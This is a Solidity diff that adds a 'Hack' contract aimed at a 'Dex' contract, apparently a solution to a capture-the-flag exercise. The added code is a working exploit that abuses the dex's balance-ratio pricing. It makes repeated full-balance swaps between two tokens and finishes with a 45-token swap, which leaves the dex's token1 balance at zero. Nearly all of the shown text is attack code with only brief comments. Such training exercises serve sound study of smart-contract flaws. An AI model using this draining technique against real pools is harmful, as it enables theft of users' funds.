@@ -5,6 +5,61 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
+contract Hack {
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
+
+    constructor(IDex _dex) {
+        dex = _dex;
+        token1 = IERC20(_dex.token1());
+        token2 = IERC20(_dex.token2());
+    }
+
+    function hack() external {
+        // transfer to hack contract
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
+
+        // approve dex contract to handle tokens
+        token1.approve(address(dex), (2 ** 256 - 1));
+        token2.approve(address(dex), (2 ** 256 - 1));
+
+        // swap 5 times the max amount (balanceOf) + the last one with 45 tokens to drain token1 balance of the dex contract to 0
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+
+        dex.swap(address(token2), address(token1), 45);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
+    }
+
+    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
+        dex.swap(
+            address(tokenIn),
+            address(tokenOut),
+            tokenIn.balanceOf(address(this))
+        );
+    }
+}
+
+interface IDex {
+    function token1() external view returns (address);
+
+    function token2() external view returns (address);
+
+    function getSwapPrice(
+        address from,
+        address to,
+        uint256 amount
+    ) external view returns (uint256);
+
+    function swap(address from, address to, uint256 amount) external;
+}
+
 contract Dex is Ownable {
     address public token1;
     address public token2;
